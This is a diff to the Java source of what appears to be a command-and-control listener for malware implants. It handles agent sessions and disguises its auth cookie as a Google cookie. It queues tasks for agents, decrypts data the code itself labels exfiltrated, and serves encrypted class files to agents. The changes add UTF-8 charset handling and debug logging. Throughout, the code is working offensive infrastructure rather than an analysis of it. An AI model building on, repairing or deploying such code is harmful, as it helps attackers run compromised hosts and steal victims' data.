@@ -116,11 +116,11 @@ public class ListenerApplication {
 				currentKey = sessionData.encKey;
 			}
 
-			byte[] rawPostData = Base64.getUrlDecoder().decode(requestData.replace("=","").getBytes());
+			byte[] rawPostData = Base64.getUrlDecoder().decode(requestData.replace("=","").getBytes(StandardCharsets.UTF_8));
 			byte[] decryptedData;
 			try 
 			{
-				decryptedData = sapi.decrypt(rawPostData,sessionData.nonce.getBytes(),currentKey);
+				decryptedData = sapi.decrypt(rawPostData,sessionData.nonce.getBytes(StandardCharsets.UTF_8),currentKey);
 			}
 			catch (AEADBadTagException e)
 			{
@@ -149,7 +149,7 @@ public class ListenerApplication {
 					sessionData.tasks.add(napi.mkTask("autoLib","metadata",downstreamUUID,new String[]{}));
 				}
 			}
-			System.out.println(sessionData.tasks.toString());
+
 
 			sessionData.cookie = napi.mkCookie(idCookie, epc.passwd);
 			sessionData.lastSeen = new SimpleDateFormat("yyyy.MM.dd.HH.mm.ss").format(new java.util.Date());
@@ -161,8 +161,8 @@ public class ListenerApplication {
 			String retrData = new String(
 				Base64.getEncoder().encode(
 					sapi.encrypt(
-						retrDoc.getBytes(),
-						sessionData.nonce.getBytes(),
+						retrDoc.getBytes(StandardCharsets.UTF_8),
+						sessionData.nonce.getBytes(StandardCharsets.UTF_8),
 						currentKey
 					)
 				)
@@ -180,6 +180,7 @@ public class ListenerApplication {
 		String data(@RequestBody String requestData, @CookieValue("__Secure-3PSIDCC") String authCookie, @CookieValue("uuid") String idCookie) throws Exception, NoSuchAlgorithmException, IOException, ParserConfigurationException, SAXException, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
 		{
 			session sessionData;
+			System.out.println("receiving data");
 			System.out.println(requestData);
 
 			if (!epc.sessionTable.keySet().contains(idCookie))
@@ -192,21 +193,25 @@ public class ListenerApplication {
 				sessionData  = (session) epc.sessionTable.get(idCookie);
 				if (!sessionData.cookie.equals(authCookie))
 				{
+					
 					return "error.0x73657373";
 				}
 			}
+			System.out.println("agent exists");
 
 			Hashtable xmlParsed = napi.xmlExfilToHashtable(
 				new String(
 					sapi.decrypt(
 						Base64.getUrlDecoder().decode(
-							requestData.replace("=","")
+							requestData.replace("%3D","=").getBytes(StandardCharsets.UTF_8)
 						), 
-						sessionData.nonce.getBytes(),
+						sessionData.nonce.getBytes(StandardCharsets.UTF_8),
 						sessionData.encKey
 					)
 				)
 			);
+			System.out.println("printing data");
+			System.out.println(xmlParsed.toString());
 
 			sessionData.data.add(xmlParsed);
 
@@ -249,7 +254,7 @@ public class ListenerApplication {
 				{
 					String cName = new String(
 						Base64.getEncoder().encode(
-							fName.replace(".class","").getBytes()
+							fName.replace(".class","").getBytes(StandardCharsets.UTF_8)
 						)
 					);
 
@@ -258,7 +263,7 @@ public class ListenerApplication {
 						Base64.getEncoder().encode(
 							sapi.encrypt(
 								fileData,
-								downloadNonce.substring(0,12).replace("-","").getBytes(),
+								downloadNonce.substring(0,12).replace("-","").getBytes(StandardCharsets.UTF_8),
 								epc.agentKey
 							)
 						)
@@ -569,7 +574,7 @@ class noceboApi
 
 		private SecretKey initKey(String encKey) throws Exception
 		{
-			byte[] keyBytes = encKey.getBytes();
+			byte[] keyBytes = encKey.getBytes(StandardCharsets.UTF_8);
 			SecretKey key = new SecretKeySpec(keyBytes, 0, keyBytes.length, "AES");
 			return key;
 		}
